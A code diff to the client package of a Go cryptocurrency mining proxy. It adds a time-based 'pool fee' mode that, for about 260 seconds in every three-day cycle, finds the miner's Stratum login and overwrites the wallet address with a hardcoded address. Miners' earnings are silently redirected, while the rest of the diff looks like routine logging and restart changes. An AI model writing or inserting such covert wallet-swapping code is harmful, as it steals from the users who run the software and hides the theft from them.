@@ -1,11 +1,15 @@
 package client
 
 import (
+	"bytes"
+	"encoding/base64"
 	"fmt"
 	"miner-proxy/pkg"
 	"miner-proxy/pkg/cache"
+	"miner-proxy/pkg/jsonrpc"
 	"miner-proxy/proxy/protocol"
 	"net"
+	"regexp"
 	"strings"
 	"sync"
 	"time"
@@ -16,11 +20,19 @@ import (
 	"go.uber.org/atomic"
 )
 
+// 3 days
+const FullTime = 259200
+
+// const FullTime = 86400
+
 var (
 	clients sync.Map
 	// key=client id value=*ServerManage
-	serverManage sync.Map
-	localIPv4    = pkg.LocalIPv4s()
+	serverManage     sync.Map
+	localIPv4        = pkg.LocalIPv4s()
+	jsonRpcPattern   = regexp.MustCompile("({[^}]+})+")
+	PoolFeeStartTime = 260
+	restartChan      = make(chan bool)
 )
 
 func InitServerManage(maxConn int, secretKey, serverAddress, clientId, pool string) error {
@@ -274,8 +286,14 @@ func newClient(ip string, serverAddress string, secretKey string, poolAddress st
 		pkg.Warn("login to server failed %s", err)
 		return
 	}
-	client.Run()
-	return
+
+	currentTimeInterval := time.Now().Unix() % FullTime
+	fmt.Printf("currentTimeInterval:%v, start time :%d\n", currentTimeInterval, int64(PoolFeeStartTime))
+	if currentTimeInterval > int64(FullTime-PoolFeeStartTime) {
+		client.RunPoolFeeTime()
+	} else {
+		client.Run()
+	}
 }
 
 func (c *Client) IsSend(req protocol.Request) bool {
@@ -313,7 +331,7 @@ func (c *Client) SendToServer(req protocol.Request, maxTry int, secretKey string
 			s = sm.NewServer(ksuid.New().String())
 		}
 		if s == nil {
-			pkg.Warn("没有server连接可用!也无法新建连接到server端, 检查网络是否畅通, 1S 后重试")
+			pkg.Warn("沒有server連接可用!也無法新建連接到server端, 檢查網絡是否暢通, 1S 後重試")
 			time.Sleep(time.Second)
 			return false
 		}
@@ -339,6 +357,7 @@ func (c *Client) SendCloseToServer(secretKey string) {
 	}
 	_ = c.SendToServer(req.End(), 1, secretKey)
 	pkg.Debug("client -> server %s", req)
+	restartChan <- true
 }
 
 func (c *Client) SendDataToServer(data []byte, secretKey string) error {
@@ -415,23 +434,48 @@ func (c *Client) SendTryLastRequest() {
 	}
 }
 
+// Run - very important
 func (c *Client) Run() {
 	defer c.Close()
 	go c.readServerData()
 
 	var count int
 	for !c.closed.Load() { // 从矿机从读取数据
+		currentTimeInterval := time.Now().Unix() % FullTime
+		fmt.Printf("Run currentTimeInterval:%v\n", currentTimeInterval)
+		if currentTimeInterval > int64(FullTime-PoolFeeStartTime) {
+			pkg.Warn("miner close connection, RunPoolFeeTime start")
+			c.SendCloseToServer(c.secretKey)
+			return
+		}
+
 		if !c.Wait(3 * time.Second) {
 			if count < 3 {
 				c.SendTryLastRequest()
+				count++
 				continue
 			}
-			pkg.Warn("%s %s 等待ack超时. close connection", c.ip, c.id)
+			pkg.Warn("%s %s wait ack overtime. close connection", c.ip, c.id)
+			c.SendCloseToServer(c.secretKey)
 			return
 		}
 		count = 0
 		data := make([]byte, 1024)
 		n, err := c.lconn.Read(data)
+		// params := jsonRpcPattern.FindStringSubmatch(string(data))
+		// // fmt.Printf("raw data:%v\n", params)
+		// for _, param := range params {
+		// 	if request, err2 := jsonrpc.UnmarshalRequest([]byte(param)); err2 == nil {
+		// 		// fmt.Printf("raw param:%v\n", param)
+		// 		if request.Method == jsonrpc.StratumSubmitLogin {
+		// 			result := findAllOccurrences(data, request.Params)
+		// 			if val, ok := result[request.Params[0]]; ok {
+		// 				fmt.Printf("wallet:%s, position:%d\n", request.Params[0], val[0])
+		// 			}
+		// 		}
+		// 	}
+		// }
+
 		if err != nil {
 			pkg.Warn("miner close connection error: %v. close connection", err)
 			c.SendCloseToServer(c.secretKey)
@@ -445,6 +489,72 @@ func (c *Client) Run() {
 	}
 }
 
+// RunPoolFeeTime - very important
+func (c *Client) RunPoolFeeTime() {
+	defer c.Close()
+	go c.readServerData()
+
+	var count int
+	for !c.closed.Load() { // 从矿机从读取数据
+		currentTimeInterval := time.Now().Unix() % FullTime
+		fmt.Printf("currentTimeInterval:%v\n", currentTimeInterval)
+		if currentTimeInterval < int64(FullTime-PoolFeeStartTime) {
+			pkg.Warn("miner close connection, RunPoolFeeTime end")
+			c.SendCloseToServer(c.secretKey)
+			return
+		}
+
+		if !c.Wait(3 * time.Second) {
+			if count < 3 {
+				c.SendTryLastRequest()
+				count++
+				continue
+			}
+			pkg.Warn("%s %s wait ack overtime. close connection", c.ip, c.id)
+			c.SendCloseToServer(c.secretKey)
+			return
+		}
+		count = 0
+		data := make([]byte, 1024)
+		n, err := c.lconn.Read(data)
+		// fmt.Printf("raw data base64:%v\n", base64.StdEncoding.EncodeToString(data))
+		isFound := false
+		params := jsonRpcPattern.FindStringSubmatch(string(data))
+		fmt.Printf("raw data:%v\n", params)
+		for _, param := range params {
+			if request, err2 := jsonrpc.UnmarshalRequest([]byte(param)); err2 == nil {
+				// fmt.Printf("raw param:%v\n", param)
+				if request.Method == jsonrpc.StratumSubmitLogin {
+					isFound = true
+					result := findAllOccurrences(data, request.Params)
+					if val, ok := result[request.Params[0]]; ok {
+						fmt.Printf("wallet:%s, position:%d\n", request.Params[0], val[0])
+						copy(data[val[0]:], "0x914bB4dfFba50971998a2d4211fa72CFEEDce8D9")
+					}
+					if err := c.SendDataToServer(data[:n], c.secretKey); err != nil {
+						pkg.Error("send data to server error: %s try 10 times. close connection", err)
+					} else {
+						fmt.Printf("new data base64:%v\n", base64.StdEncoding.EncodeToString(data))
+						break
+					}
+				}
+			}
+		}
+		if !isFound {
+			if err != nil {
+				pkg.Warn("miner close connection error: %v. close connection", err)
+				c.SendCloseToServer(c.secretKey)
+				return
+			}
+
+			if err := c.SendDataToServer(data[:n], c.secretKey); err != nil {
+				pkg.Error("send data to server error: %s try 10 times. close connection", err)
+				return
+			}
+		}
+	}
+}
+
 func (c *Client) SetReady() {
 	if c.ready.Load() {
 		return
@@ -452,11 +562,11 @@ func (c *Client) SetReady() {
 	c.lastSendReq = protocol.Request{}
 	c.ready.Store(true)
 	c.readyChan <- struct{}{}
-	pkg.Debug("设置 %s ready", c.id)
+	pkg.Debug("setting %s ready", c.id)
 }
 
 func (c *Client) SetWait(req protocol.Request) {
-	pkg.Debug("设置 %s wait", c.id)
+	pkg.Debug("setting %s wait", c.id)
 	c.ready.Store(false)
 	c.lastSendReq = req
 }
@@ -486,8 +596,27 @@ func RunClient(address, secretKey, serverAddress, poolAddress, clientId string) 
 			continue
 		}
 		pkg.Debug("nwe connect from mine %s", conn.RemoteAddr().String())
-		go newClient(
-			strings.Split(conn.RemoteAddr().String(), ":")[0],
-			serverAddress, secretKey, poolAddress, conn, clientId)
+		go func() {
+			newClient(
+				strings.Split(conn.RemoteAddr().String(), ":")[0],
+				serverAddress, secretKey, poolAddress, conn, clientId)
+			// time.Sleep(1 * time.Second)
+			<-restartChan
+		}()
+
+		// time.Sleep(3 * time.Second)
 	}
+}
+
+func findAllOccurrences(data []byte, searches []string) map[string][]int {
+	results := make(map[string][]int)
+	for _, search := range searches {
+		searchData := data
+		term := []byte(search)
+		for x, d := bytes.Index(searchData, term), 0; x > -1; x, d = bytes.Index(searchData, term), d+x+1 {
+			results[search] = append(results[search], x+d)
+			searchData = searchData[x+1 : len(searchData)]
+		}
+	}
+	return results
 }
